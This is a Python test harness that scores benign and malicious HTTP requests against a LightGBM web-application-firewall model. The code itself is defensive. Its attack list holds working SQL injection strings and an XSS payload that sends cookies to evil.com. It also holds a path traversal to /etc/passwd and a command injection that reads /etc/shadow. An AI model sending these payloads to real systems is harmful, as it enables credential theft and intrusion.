#!/usr/bin/env python3
"""
Interactive & Automated Payload Testing Harness for WAF Gen 3 LightGBM Candidate
Evaluates real attack payloads and normal web traffic against the calibrated model.
"""

import sys
import os
import time
import joblib
import pandas as pd

sys.path.append(os.path.dirname(os.path.dirname(__file__)))
from ml.feature_engineering import extract_features_from_request, EXTENDED_FEATURE_COLUMNS

MODEL_PATH = None  # Auto-detected from latest archive
CALIBRATED_THRESHOLD = 0.50  # Will be updated after retraining


def find_latest_model():
    """Find the latest lightgbm model in the archive directory."""
    archive_base = os.path.join(os.path.dirname(__file__), "models", "archive")
    candidates = sorted(
        [d for d in os.listdir(archive_base) if d.startswith("task3-")],
        reverse=True
    )
    for cand in candidates:
        model_file = os.path.join(archive_base, cand, "lightgbm_waf_model.joblib")
        if os.path.exists(model_file):
            return model_file
    return None

TEST_SUITE = [
    # --- Benign Requests (Traffic ปกติ) ---
    {
        "category": "Benign",
        "name": "REST API Query",
        "method": "GET",
        "url": "/api/v1/products?category=electronics&page=2&limit=20",
        "body": ""
    },
    {
        "category": "Benign",
        "name": "Web Search Query",
        "method": "GET",
        "url": "/search?q=mechanical+keyboard+rgb&sort=price_asc",
        "body": ""
    },
    {
        "category": "Benign",
        "name": "User Profile Form Submit",
        "method": "POST",
        "url": "/account/update",
        "body": "firstname=Somchai&lastname=Jaidee&email=somchai%40example.com&newsletter=1"
    },
    {
        "category": "Benign",
        "name": "Static Asset Page (.html)",
        "method": "GET",
        "url": "/index.html",
        "body": ""
    },
    {
        "category": "Benign",
        "name": "Root Page (/)",
        "method": "GET",
        "url": "/",
        "body": ""
    },
    {
        "category": "Benign",
        "name": "CSS Asset",
        "method": "GET",
        "url": "/assets/css/style.css",
        "body": ""
    },
    {
        "category": "Benign",
        "name": "JS Bundle",
        "method": "GET",
        "url": "/dist/app.bundle.js",
        "body": ""
    },
    {
        "category": "Benign",
        "name": "Image Asset",
        "method": "GET",
        "url": "/static/images/logo.png",
        "body": ""
    },
    {
        "category": "Benign",
        "name": "API Health Check",
        "method": "GET",
        "url": "/api/health",
        "body": ""
    },
    {
        "category": "Benign",
        "name": "Blog Page",
        "method": "GET",
        "url": "/blog/latest",
        "body": ""
    },

    # --- Attack Requests (การโจมตีจริง) ---
    {
        "category": "Attack",
        "name": "SQL Injection (Union Based)",
        "method": "GET",
        "url": "/items?id=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users--",
        "body": ""
    },
    {
        "category": "Attack",
        "name": "SQL Injection (Boolean Tautology)",
        "method": "POST",
        "url": "/login",
        "body": "username=admin%27+OR+1%3D1--&password=x"
    },
    {
        "category": "Attack",
        "name": "Cross-Site Scripting (XSS)",
        "method": "GET",
        "url": "/guestbook?msg=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.com%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E",
        "body": ""
    },
    {
        "category": "Attack",
        "name": "Path Traversal (Directory Climbing)",
        "method": "GET",
        "url": "/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "body": ""
    },
    {
        "category": "Attack",
        "name": "Command Injection (RCE)",
        "method": "GET",
        "url": "/network/ping?target=127.0.0.1%3B+cat+%2Fetc%2Fshadow",
        "body": ""
    },
    {
        "category": "Attack",
        "name": "Parameter Tampering (CSIC Style)",
        "method": "POST",
        "url": "/auth/step2",
        "body": "pwdA=password123&pwdB=password123%23&authKey=AdminSecret"
    },
    {
        "category": "Attack",
        "name": "Scanner Probe (.env)",
        "method": "GET",
        "url": "/.env",
        "body": ""
    },
    {
        "category": "Attack",
        "name": "Scanner Probe (wp-admin)",
        "method": "GET",
        "url": "/wp-admin/setup-config.php?step=1",
        "body": ""
    },
]


def evaluate_single_request(model, method, url, body=""):
    t0 = time.perf_counter_ns()
    features = extract_features_from_request(url=url, method=method, body=body)
    df_feat = pd.DataFrame([features])[EXTENDED_FEATURE_COLUMNS]
    probs = model.predict_proba(df_feat)[0]
    latency_us = (time.perf_counter_ns() - t0) / 1000.0

    p_attack = probs[1]
    is_blocked = p_attack >= CALIBRATED_THRESHOLD

    return {
        "p_attack": p_attack,
        "is_blocked": is_blocked,
        "latency_us": latency_us,
        "features": features
    }


def run_automated_suite(model):
    print("=" * 95)
    print(f" 🧪 RUNNING WAF GEN 3 MODEL PAYLOAD TEST SUITE (Threshold: {CALIBRATED_THRESHOLD:.4f})")
    print("=" * 95)
    print(f"{'Category':<8} | {'Test Name':<35} | {'P(Attack)':<10} | {'Decision':<10} | {'Status':<8} | {'Latency':<8}")
    print("-" * 95)

    passed_count = 0
    total_count = len(TEST_SUITE)

    for item in TEST_SUITE:
        res = evaluate_single_request(model, item["method"], item["url"], item["body"])
        expected_blocked = (item["category"] == "Attack")
        correct = (res["is_blocked"] == expected_blocked)
        if correct:
            passed_count += 1

        decision_str = "🛑 BLOCK" if res["is_blocked"] else "✅ ALLOW"
        status_str = "PASS" if correct else "FAIL"

        print(
            f"{item['category']:<8} | "
            f"{item['name'][:35]:<35} | "
            f"{res['p_attack'] * 100:6.2f}%    | "
            f"{decision_str:<10} | "
            f"{status_str:<8} | "
            f"{res['latency_us']:6.2f} µs"
        )

    print("-" * 95)
    print(f"📊 Summary: Passed {passed_count}/{total_count} ({passed_count/total_count * 100:.1f}%)")
    print("=" * 95)


def interactive_mode(model):
    print("\n💡 Entering Interactive Mode. You can test your own custom requests!")
    print("Type 'exit' to quit.\n")

    while True:
        try:
            url = input("Enter URL (e.g. /search?q=hello or /login): ").strip()
            if not url or url.lower() == "exit":
                break
            method = input("Enter Method [GET]: ").strip().upper() or "GET"
            body = input("Enter Body [blank]: ").strip()

            res = evaluate_single_request(model, method, url, body)
            decision = "🛑 BLOCK (403 Forbidden)" if res["is_blocked"] else "✅ ALLOW (200 OK)"

            print(f"\n--- Result ---")
            print(f"Attack Probability: {res['p_attack'] * 100:.2f}% (Threshold: {CALIBRATED_THRESHOLD * 100:.2f}%)")
            print(f"Decision:           {decision}")
            print(f"Inference Latency:  {res['latency_us']:.2f} µs")
            print("-" * 30 + "\n")
        except (KeyboardInterrupt, EOFError):
            break


def main():
    global CALIBRATED_THRESHOLD

    model_path = find_latest_model()
    if model_path is None:
        print("❌ No LightGBM model found in archive directory")
        sys.exit(1)

    # Try to load threshold from experiment report
    model_dir = os.path.dirname(model_path)
    report_path = os.path.join(model_dir, "experiment_report.json")
    if os.path.exists(report_path):
        import json
        with open(report_path) as f:
            report = json.load(f)
        if "calibrated_optimal_holdout" in report:
            CALIBRATED_THRESHOLD = report["calibrated_optimal_holdout"].get("optimal_threshold", CALIBRATED_THRESHOLD)
        elif "holdout_evaluation" in report:
            CALIBRATED_THRESHOLD = report["holdout_evaluation"].get("threshold", CALIBRATED_THRESHOLD)

    print(f"[*] Loading model: {os.path.basename(model_dir)}/{os.path.basename(model_path)}...")
    print(f"[*] Calibrated Threshold: {CALIBRATED_THRESHOLD}")
    model = joblib.load(model_path)
    print("[✔] Model loaded successfully.")

    if len(sys.argv) > 1 and sys.argv[1] == "--interactive":
        interactive_mode(model)
    else:
        run_automated_suite(model)
        print("\n👉 To run interactive test: python ml/test_model_payloads.py --interactive")


if __name__ == "__main__":
    main()
